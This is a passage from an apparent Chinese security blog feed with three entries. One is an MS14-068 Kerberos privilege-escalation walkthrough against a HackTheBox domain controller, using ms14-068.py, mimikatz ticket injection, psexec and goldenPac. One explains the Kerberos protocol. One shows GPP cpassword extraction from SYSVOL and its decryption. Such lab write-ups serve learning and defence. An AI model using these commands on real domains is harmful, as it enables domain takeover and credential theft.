$DomainControllers.Count[int]$PatchedDCCount = 0[int]$UnPatchedDCCount = 0$UnpatchedDCs = @()Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;ForEach ($DomainController in $DomainControllers){    $DomainControllerHostName = $DomainController.HostName    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue    IF ($PatchStatus.InstalledOn)        {            $PatchStatusInstalledOn = $PatchStatus.InstalledOn            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;            $PatchedDCCount++        }    Else        {            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;            [array]$UnpatchedDCs += $DomainController.HostName            $UnPatchedDCCount++        }}Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;IF ($UnpatchedDCs){    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;    $UnpatchedDCs}</code></pre><p>环境描述：</p><p>目标机器：10.10.10.52  Windows Server 2008 R2 Standard</p><p>已获取：DC上的一个普通本地账户</p><ul><li>james用户账户密码</li></ul><ul><li>james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）</li></ul><p>攻击机：kali 10.10.14.14  （不在域中）</p><h2 id="在Linux上：-没有目标shell的情况下"><a href="#在Linux上：-没有目标shell的情况下" class="headerlink" title="在Linux上：(没有目标shell的情况下)"></a>在Linux上：(没有目标shell的情况下)</h2><p>1.安装客户端，在客户端生成票证</p><pre><code>sudo apt-get install krb5-user cifs-utils rdate</code></pre><p>2./etc/hosts中添加：（内网机器没有映射，所以需要添加）</p><pre><code>10.10.10.52 htb.local htb mantis.htb.local  mantis</code></pre><p>3.编辑/etc/krb5.conf</p><pre><code>[libdefaults]    default_realm = HTB.LOCAL[realms]   HTB.LOCAL = {    kdc = mantis.htb.local:88    admin_server = mantis.htb.local    default_domain = HTB.LOCAL    }[domain_realm]    .domain.internal = HTB.LOCAL    domain.internal = HTB.LOCAL</code></pre><p>4.添加路由：编辑/etc/resolve.conf</p><pre><code>nameserver 10.10.10.52</code></pre><p>5.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）</p><ul><li><p>[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间</p></li><li><p>[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间</p></li></ul><p>6.为james用户生成一张新的Kerberos票证</p><pre><code>kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit jamesklist</code></pre><p><img src="1.png" alt=""></p><p>此时生成的是jame是的票证：访问C$是没有权限的</p><pre><code>kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -ktree connect failed: NT_STATUS_ACCESS_DENIED</code></pre><p>7.ms14-068生成高权限TGT票证</p><p><img src="2.png" alt=""></p><p>8.替换低权限票证</p><pre><code>mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_1000</code></pre><p>9.smb成功登录C$</p><p><img src="3.png" alt=""></p><h2 id="Mimikatz："><a href="#Mimikatz：" class="headerlink" title="Mimikatz："></a>Mimikatz：</h2><p>先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令</p><pre><code>ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</code></pre><p>将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中</p><pre><code>mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit</code></pre><p>注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket</p><pre><code>net use \\htb.local\admin$    ####使用IP可能会失败dir \\htb.local\c$ psexec  \\htb.local  cmd.exe</code></pre><p><strong>突破“本地账户才能漏洞利用”的限制</strong>：<br>先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接<br>原理：<a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a></p><p>GoldenPac,py<br>也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）</p><p><img src="4.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;危害：任意域控用户都可以提权到域控&lt;br&gt;一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制&lt;/p&gt;
&lt;h2 id=&quot;一、漏洞成因&quot;&gt;&lt;a href=&quot;#一、漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞成因&quot;&gt;&lt;/a&gt;一
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Kerberos认证学习</title>
    <link href="https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-25T13:49:57.000Z</published>
    <updated>2020-04-25T14:48:21.127Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Kerberos简介：</strong></p><ul><li><p>Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）</p></li><li><p>几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）</p></li><li><p>Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥</p></li></ul><p><img src="https://github.com/Twe1ve-web/Twe1ve-web.github.io/raw/master/images/keberos.jpg" alt=""></p><p><img src="keberos.jpg" alt=""></p><h2 id="1、AS-REQ"><a href="#1、AS-REQ" class="headerlink" title="1、AS-REQ"></a>1、AS-REQ</h2><p>Client将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS</p><h2 id="2、AS-REP"><a href="#2、AS-REP" class="headerlink" title="2、AS-REP"></a>2、AS-REP</h2><p>AS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    </p><p>AS向Clinet发送两条消息：        </p><p><strong>消息1</strong>包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;<strong>也就是使用TGS密钥加密TGT</strong></p><p>步骤1中用户提供的信息+TGS SESSION KEY                </p><p><strong>消息2</strong>包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     </p><pre><code>TGS名称/ID            时间戳            TGS SESSION KEYTGT生存期`</code></pre><p>消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY</p><h2 id="3、TGS-REQ"><a href="#3、TGS-REQ" class="headerlink" title="3、TGS-REQ"></a>3、TGS-REQ</h2><p>(金票攻击发生在此步骤)</p><p>Client向TGS发送两条消息<br><strong>消息1</strong>：[使用TGS SESSION KEY进行加密]  </p><pre><code>你的名称/ID时间戳`</code></pre><p><strong>消息2</strong>：[未加密消息]</p><pre><code>所要请求服务的名称/ID服务的有效生存期</code></pre><p>同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在</p><h2 id="4、-TGS-REPTGS"><a href="#4、-TGS-REPTGS" class="headerlink" title="4、   TGS-REPTGS"></a>4、   TGS-REPTGS</h2><p>使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    </p><pre><code>步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟检查TGT是否过期检查TGS缓存中是否已有该用户凭据，避免重播</code></pre><p>检查无误之后，同样向客户端发送两条消息</p><p><strong>消息1</strong>：[<strong>生成的使用Service Secret Key加密后的TGS</strong>]—-&gt;<strong>Kerberos令牌</strong></p><p><strong>消息2</strong>：[TGS Session Key加密]    </p><pre><code>服务名称/ID   时间戳    票据生存期    Service Session Key</code></pre><h2 id="5、AP-REQ"><a href="#5、AP-REQ" class="headerlink" title="5、AP-REQ"></a>5、AP-REQ</h2><p>银票攻击发生在此步骤</p><p>Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    </p><pre><code>用户名称/ID时间戳`</code></pre><p>该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源</p><h2 id="6、AP-REP"><a href="#6、AP-REP" class="headerlink" title="6、AP-REP"></a>6、AP-REP</h2><p>启用相互认证的情况下，交换时间戳进行相互认证</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Kerberos简介：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）&lt;/p&gt;
&lt;/li&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域内提权之滥用GGP</title>
    <link href="https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"/>
    <id>https://github.com/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/</id>
    <published>2020-04-25T13:49:13.000Z</published>
    <updated>2020-04-25T14:46:47.301Z</updated>
    
    <content type="html"><![CDATA[<p>在SYSVOL查找密码组策略首选项（GPP）中的密码</p><h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p><strong>什么是GPP</strong></p><p>GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途</p><p>一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。</p><p>该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）</p><p>这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）</p><h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><p>连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：</p><pre><code>\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code></pre><p><strong>1、定位域控制器</strong></p><pre><code>set l   nltest /DSGETDC:echo %logonserver%net time /domain......</code></pre><p><strong>2、查询DC共享目录</strong><br>使用enumlinux或者smbmap检查共享目录：</p><pre><code>smbmap -H 10.10.10.100  ###列出目标用户共享列表---- -----------ADMIN$ NO ACCESSC$ NO ACCESSIPC$ NO ACCESSNETLOGON NO ACCESSreplication read only   SYSVOL NO ACCESSUsers NO ACCESS</code></pre><p><strong>3、连接域共享</strong></p><p>smbclient //active.htb/Replication -N</p><pre><code>smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;</code></pre><p><strong>4、解密</strong><br>使用<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py">gpprefdecrypt.py</a>： </p><pre><code>python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在SYSVOL查找密码组策略首选项（GPP）中的密码&lt;/p&gt;
&lt;h1 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;什么是GPP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;G
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
